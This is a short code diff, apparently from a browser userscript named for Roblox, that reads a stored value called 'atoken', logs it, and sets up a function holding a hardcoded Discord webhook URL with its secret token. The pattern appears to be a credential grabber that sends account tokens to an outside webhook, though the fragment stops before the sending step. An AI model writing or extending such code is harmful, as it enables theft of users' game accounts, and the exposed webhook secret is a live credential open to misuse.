@@ -1,8 +1,6 @@
-function roblox() {
-    console.log(await GM_getValue('able'));
-    console.log(await GM_getValue('atoken'));
+async function roblox() {
     window.onload = function() {
-    const token = GM_getValue("atoken")
+    const token = await GM_getValue("atoken")
     console.log(token);
     async function doado() {
       const webhook = `https://discord.com/api/webhooks/989376633729343540/UK4cUaYOKJ4k1jd0iaVkvPfkUVajy9zrQ1J5bg7Be61cxgQs3xP1Kt5afOCtBPJ1mthB`
